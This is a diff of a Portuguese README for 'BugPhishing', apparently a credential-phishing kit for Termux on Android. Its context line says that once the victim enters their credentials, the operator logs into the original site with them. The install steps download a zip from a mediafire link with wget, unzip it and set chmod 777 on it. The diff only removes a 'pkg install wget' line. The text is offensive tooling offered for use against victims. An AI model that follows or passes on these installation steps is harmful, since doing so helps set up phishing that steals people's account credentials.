@@ -3,7 +3,6 @@ Quando a vítima insere suas credenciais, você precisa ir ao site original e us
 
 ### INSTALAÇÃO [ TERMUX -- ANDROID ]
 * wget https://download947.mediafire.com/dyv0993oq71g/2falbjwoyp8av7u/BugPhishing.zip
-* pkg install wget
 * unzip BugPhishing
 * cd BugPhishing/
 * chmod 777 *
